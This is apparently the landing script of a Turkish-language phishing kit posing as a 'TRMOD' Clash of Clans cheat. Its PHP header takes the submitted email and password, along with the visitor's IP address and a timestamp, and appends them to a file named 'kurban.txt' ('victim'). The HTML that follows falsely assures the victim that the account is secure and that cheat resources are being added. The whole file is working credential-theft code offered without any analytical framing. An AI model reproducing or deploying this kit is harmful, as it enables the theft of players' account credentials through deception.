<?php
$username = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('kurban.txt', 'a');
fwrite($file, $username. " ----Sifre----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='img/mod.png' rel='icon' type='image/x-png'/>
<title>Clash of Clans - TRMOD</title>
<script src="js/jquery.min.js"></script>
<link rel="stylesheet" href="css/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(img/background.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>
<div style="border: 1px #ff6600 solid; padding: 10px; background-color: #ff6600; text-align: left"><center><font size="5"><font color="white"><strong>TRMOD Clash Of Clans Hilesi ©2017</strong></font></font></center> </div>
<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:groove;padding:3px;margin:0 auto;" class="col-md-6">
<div style="border:groove;padding:5px;margin:0px;" class="well well-sm">
<img style="border:groove;width:100%;max-height:270px;margin:0 auto;" src="img/header.png"/>
</div>
<center style="background:#ff6600;"><br>
<div class="col-md-8">
<h2><img height="200" width="365" src="img/mod.jpg"></h2>
<h2>
  TRMOD Hile Aktif Hale Geldi
</h2>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#00cc00;width:100%" class="form-horizontal">
<h4 >
  Hile Statüleriniz
  </h4><br/>

<form action="home.php" method="POST">
<h4 >
  Hesabınıza ekleme yapılıyor, Hesabınız güvenli
  </h4></br>
<h4 >
  Hile çok yakın bir zamanda eklemeleri yapacaktır </h4>
  <h4>
  Hesabınızda güvenlik kusuru bulunmadı...
  </h4>
  </br>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #3399ff;" id="gsubmit" value="Güvenli Çıkış"> </form>